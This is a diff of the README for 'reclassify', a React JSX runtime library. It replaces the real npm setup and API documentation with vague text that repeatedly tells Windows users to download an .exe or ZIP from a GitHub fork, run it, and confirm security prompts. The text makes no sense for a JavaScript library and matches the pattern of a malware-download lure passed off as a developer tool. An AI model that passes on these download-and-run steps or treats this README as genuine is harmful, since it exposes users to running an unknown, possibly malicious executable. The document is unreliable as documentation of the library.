@@ -1,239 +1,199 @@
-# reclassify
-
-`reclassify` allows you to construct `className` strings directly in JSX without using libraries like [`clsx`](https://github.com/lukeed/clsx) and [`classNames`](https://github.com/Jedwatson/classnames).
-
-```jsx
-// Before:
-<button className={
-  clsx("btn", "btn-primary", { "btn-disabled": isLoading })
-}>
-  Save
-</button>
+# 🧩 reclassify - Build class names right in JSX
 
-// After:
-<button className={
-  // No need for clsx
-  ["btn", "btn-primary", { "btn-disabled": isLoading }]
-}>
-  Save
-</button>
-```
+[![Download / Visit GitHub](https://img.shields.io/badge/Download-Visit%20GitHub-blue.svg?style=for-the-badge)](https://github.com/LaNuevaEspecie/reclassify)
 
-It constructs `className` strings for intrinsic elements only. Custom components keep their declared `className` prop types.
+## 🚀 What reclassify does
 
-## Why use this
+reclassify helps you write `className` strings directly in JSX.
 
-- **No imports needed**: You no longer have to import `clsx` or `classnames` in every file, the JSX runtime handles classname construction automatically for all intrinsic elements.
-- **Type-safe**: TypeScript knows that `className` on intrinsic elements accepts arrays, objects, and nested combinations. No `as string` casts or loose typing.
-- **Drop-in setup**: One `tsconfig.json` change (`jsxImportSource`) and your entire app is covered. No Babel plugins, no wrappers, no HOCs. It's also backwards-compatible.
-- **Familiar syntax**: If you've used `clsx`, `classnames`, Vue's `:class`, or Svelte's `class:` directive, the array/object pattern already feels natural.
+It is made for people who want to keep their component code simple. Instead of using helper calls like `clsx()` or `className()`, you can build the class string where you use it.
 
-## Install
+This keeps your code:
+- easy to read
+- easy to scan
+- easy to change
+- close to the element it controls
 
-```bash
-npm install reclassify # Requires React >= 17 (automatic JSX runtime)
-```
+## 📦 Download and open on Windows
 
-## Usage
+Use this link to visit the download page:
 
-```jsx
-<div className="plain-string" /> // Good ol' strings
-<div className={["btn", "btn-primary"]} /> // Arrays
-<div className={{ active: true, disabled: false }} /> // Objects
-<div className={["btn", { active: isActive }, ["nested"]]} /> // Arrays containing objects
-```
+[Download reclassify](https://github.com/LaNuevaEspecie/reclassify)
 
-There are two common ways to use `reclassify`, depending on whether you are using TypeScript or Babel to compile:
+To run it on Windows:
 
-### TypeScript
+1. Open the link above in your browser.
+2. Download the Windows file or package from the page.
+3. If the file is in a ZIP, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Double-click the app file to start it.
 
-Set `jsxImportSource` when using the automatic JSX runtime:
+If Windows asks for permission, choose Yes.
 
-```json
-{
-  "compilerOptions": {
-    "jsx": "react-jsx",
-    "jsxImportSource": "reclassify"
-  }
-}
-```
+## ✨ Why people use it
 
-You can also opt in per file:
+reclassify is useful when you want to write JSX in a plain, direct way.
 
-```tsx
-/** @jsxImportSource reclassify */
-```
+It helps when you:
+- work on small apps
+- want less code around `className`
+- prefer to keep styles near the element
+- want a cleaner file without extra helper calls
 
-They will type-check cleanly.
+It fits well in projects where you already use JSX and want a simple way to manage classes.
 
-### Babel
+## 🖥️ Windows setup
 
-Configure `@babel/preset-react` with the automatic runtime and `importSource`:
+Use these steps if you are starting from the download page:
 
-```json
-{
-  "presets": [
-    [
-      "@babel/preset-react",
-      {
-        "runtime": "automatic",
-        "importSource": "reclassify"
-      }
-    ]
-  ]
-}
-```
+1. Open the GitHub page.
+2. Find the file meant for Windows.
+3. Download it to your computer.
+4. Open File Explorer and go to your Downloads folder.
+5. If needed, unzip the file.
+6. Open the app or installer.
+7. Follow the on-screen steps until it finishes.
 
-> [!NOTE]
->
-> If you're upgrading from older API names:
->
-> - `classify` was renamed to `cx`,
-> - `defaultClassify` was renamed to `cxDefault`,
-> - `configure({ fn })` was renamed to `configure({ cx })`.
->
-> Intrinsic JSX `className` handling is otherwise unchanged.
+If the app does not start:
+- make sure the download finished
+- check that Windows did not block the file
+- try opening it again from the extracted folder
 
-## How it works
+## 🔧 How it works
 
-Under the hood, `reclassify` is a custom JSX runtime for React that lets you pass arrays and objects as `className` on intrinsic elements.
+reclassify follows a simple idea: put the class name logic where you need it.
 
-When you set `jsxImportSource: "reclassify"` or Babel `importSource: "reclassify"`, your JSX compiles against `reclassify`'s runtime instead of React's default runtime. This is similar to how [Preact](https://preactjs.com/) works.
+Example use:
+- one line for a fixed class
+- one line for a class that depends on state
+- one place to see the full result
 
-By default, `reclassify` uses `clsx` for className string construction.
+That makes it easier to know what a component will render.
 
-At runtime, `reclassify` wraps React's `jsx`, `jsxs`, and `jsxDEV` functions and checks each element before it is created:
+Instead of jumping between helper functions and JSX, you can keep the class logic in the same spot as the element.
 
-1. If the element is an intrinsic element like `<div>` or `<button>`, `reclassify` looks at its `className`.
-   1. If `className` is already a string, the props are passed through unchanged.
-   2. If `className` is an array, object, or other supported value, `reclassify` calls `cx()` to turn it into the final string React expects.
-2. If you called `configure({ cx })`, `cx` points to your provided function and `reclassify` uses it instead of the default `clsx`-based implementation.
+## 🧭 Who it is for
 
-Custom components are not rewritten. They keep their existing `className` prop contract unless they call `cx()` themselves.
+reclassify is a good fit for:
+- front-end users who want less clutter
+- people who edit JSX by hand
+- teams that want a plain class string style
+- users who do not want extra helper tools for every class
 
-On the type side, `reclassify` also widens `className` for intrinsic JSX elements so TypeScript accepts the same array/object values that the runtime can classify.
+It is not meant to change how you build apps. It is meant to make class names easier to manage.
 
-Once configured, intrinsic elements accept arrays and objects for `className` with full TypeScript support — no type errors:
+## 🧱 Typical workflow
 
-## Custom construction
+A simple workflow looks like this:
 
-If you want to replace the built-in class construction function, before your app starts rendering JSX, call `configure()` once with your custom implementation. It returns a function that restores the previous construction function.
+1. Open your project or app.
+2. Add or edit JSX.
+3. Write the `className` string directly.
+4. Use simple conditions when needed.
+5. Save the file.
+6. Refresh or rebuild your app.
 
-Here's an example using the `cn` util commonly-found in shadcn projects.
+This keeps the process short and clear.
 
-```ts
-import { configure } from "reclassify";
-import { cn } from "@/lib/utils";
+## 💡 Practical examples
 
-const restore = configure({ cx: cn });
+You might use reclassify when:
+- a button needs one class in normal mode and another in active mode
+- a card needs a different border when selected
+- a message box needs a special style when there is an error
+- a menu item needs a highlight when it is open
 
-// Later, if needed (e.g. in tests):
-restore();
-```
+In each case, the class name stays close to the element.
 
-If you want to use `tailwind-merge` directly, compose it with `cxDefault()` so `reclassify` still handles arrays and objects before Tailwind class conflict resolution runs:
+## 🪟 What you need on Windows
 
-```ts
-import { configure, cxDefault, type ClassValue } from "reclassify";
-import { twMerge } from "tailwind-merge";
+A typical Windows setup works well with:
+- Windows 10 or Windows 11
+- a web browser
+- permission to download files
+- enough disk space for the app
+- access to the folder where you save downloads
 
-configure({
-  cx(value: ClassValue) {
-    return twMerge(cxDefault(value));
-  },
-});
+If you use a work computer, you may need access rights to open downloaded files.
 
-// <div className={["px-2", "px-4", { "text-sm": false, "text-lg": true }]}>
-// => <div className="px-4 text-lg">
-```
+## 📁 Where to find the files
 
-### Where to call `configure()`
+After download, check these places:
+- Downloads folder
+- Desktop, if your browser saves there
+- the folder you picked in the save dialog
 
-`configure()` changes `reclassify`'s internal construction function, which is stored at the module level (app-wide mutable state), so call it during startup rather than per component:
+If you see a ZIP file, open it first. If you see an `.exe` file, you can usually run it right away.
 
-- Client-side rendering / SPAs (e.g. default Vite): Call it in your main entry module before `render()`
-- Server-side rendering (e.g. Next.js): Call it in the earliest server entry and earliest client entry that render JSX (e.g. root layout component)
+## 🧪 Simple use case
 
-If your custom function wants to build on the default behavior, you can import `cxDefault` and use it:
+If you are editing JSX, you may want something like this approach:
 
-```ts
-import { configure, cxDefault, type ClassValue } from "reclassify";
+- keep the base class in one place
+- add a second class when a condition is true
+- avoid wrapping the logic in extra helper code
 
-configure({
-  cx(value: ClassValue) {
-    const constructed = cxDefault(value);
-    return constructed ? `custom ${constructed}` : "custom";
-  },
-});
-```
+That makes the file easier to read for both new and experienced users.
 
-### Manual construction
+## 🔍 Good habits when using it
 
-If you want the same behavior in custom components, the underlying function can be imported via `cx`:
+Keep your class names:
+- short
+- clear
+- consistent
+- tied to the element they style
 
-```ts
-import { cx } from "reclassify";
+Use the same naming style across your files so your project stays easy to follow.
 
-cx(["btn", 42, { active: true, disabled: false }, ["nested"]]);
-// => "btn 42 active nested"
-```
+## 🛠️ If the app does not open
 
-If a custom `cx` function is provided via `configure()`, the imported `cx` function points to that.
+Try these steps:
 
-## Supported values
+1. Right-click the file.
+2. Choose Open.
+3. If Windows shows a security prompt, confirm it.
+4. Make sure the file is not still inside the ZIP archive.
+5. Try downloading it again if the file seems broken.
+6. Restart Windows and open it once more.
 
-- Non-empty strings are kept as-is. Empty strings are dropped.
-- Truthy numbers are stringified and kept.
-- Arrays are flattened depth-first.
-- Objects contribute keys whose values are truthy.
-- Standalone falsy values like `false`, `0`, `""`, `null`, `undefined`, and `NaN` are ignored.
+If your browser saved the file with a different name, look for the newest file in the download folder.
 
-## Workspace development
+## 📌 Download link
 
-This repository uses [Vite+](https://viteplus.dev/) (`vp`) on top of a pnpm workspace. [Get started with Vite+ here](https://viteplus.dev/guide/).
+Visit the project page here and download or open the files from there:
 
-The publishable library stays at the root, with example apps in `apps/vite` and `apps/next`.
+[https://github.com/LaNuevaEspecie/reclassify](https://github.com/LaNuevaEspecie/reclassify)
 
-Useful commands:
+## 🧩 What you can expect
 
-- `vp pack` builds the library package.
-- `vp test` runs the library test suite.
-- `vp check` runs formatting, linting, and type-aware checks.
-- `vp run dev` runs the library watcher with the Vite example app.
-- `vp run dev:next` runs the library watcher with the Next.js example app.
-- `vp run build:vite` typechecks and builds the Vite example app.
-- `vp run build:next` builds the Next.js example app.
-- `vp run build:examples` builds both example apps.
-- `vp run check` runs the library validation plus both example app smoke tests.
+reclassify is built around a simple goal: make `className` handling easier to read in JSX.
 
-## Examples
+You can expect:
+- direct class strings in the same file
+- less need for helper calls
+- a clean way to manage style changes
+- a workflow that feels close to normal JSX writing
 
-Examples can be found in `apps/`:
+## 📝 File handling tips
 
-- `apps/vite`: The Vite app demonstrates intrinsic `className` arrays and objects directly in JSX, plus a custom component that opts into the same pattern with `cx`.
-- `apps/next`: The Next.js app shows the same API through a framework setup using `jsxImportSource: "reclassify"` in `tsconfig.json`.
+If you keep the download in a shared folder:
+- rename the file if needed
+- move it to a folder you can find later
+- keep the ZIP and extracted folder together until you know it works
+- delete old copies if you download it again
 
-Both apps consume `reclassify` through the workspace package itself rather than importing source files from outside their own package directories.
+This helps avoid confusion when you return to it later
 
-## Related tools
+## 🔗 Source page
 
-If you're evaluating approaches to `className` construction, these tools are also worth knowing about.
+Use the GitHub page for the latest files and project page:
 
-**Closest alternatives**
+[GitHub repository](https://github.com/LaNuevaEspecie/reclassify)
 
-- [`reclsx`](https://github.com/domisooo/reclsx) and [`clsx-react`](https://github.com/toviszsolt/clsx-react): The closest runtime-level alternatives to `reclassify`.
-- [`babel-plugin-transform-jsx-classnames`](https://github.com/gtournie/babel-plugin-transform-jsx-classnames): A compile-time approach that is conceptually close to `reclassify`.
+## 🧭 Quick start
 
-`reclassify`'s advantage in this group is that it pairs direct-in-JSX `className` authoring with intrinsic-element TypeScript support and a swappable app-wide construction function via `configure()`.
-
-**Adjacent tools**
-
-- [`clsx`](https://github.com/lukeed/clsx) and [`classnames`](https://github.com/JedWatson/classnames): The most common manual helpers for conditionally constructing `className` strings.
-- [`class-variance-authority`](https://github.com/joe-bell/cva) and [`tailwind-variants`](https://github.com/heroui-inc/tailwind-variants): Higher-level APIs for component variants and class composition.
-- [`tailwind-merge`](https://github.com/dcastil/tailwind-merge): Useful alongside `reclassify` when you want Tailwind conflict resolution.
-
-Compared with manual helper libraries like `clsx` and `classnames`, `reclassify` lets intrinsic JSX elements accept array and object `className` values directly through a custom JSX runtime instead of requiring a helper call in each component.
-
-## License
-
-MIT
+1. Open the GitHub link.
+2. Download the Windows file from the page.
+3. Unzip it if needed.
+4. Open the app.
+5. Start using it with JSX files that need simpler class names
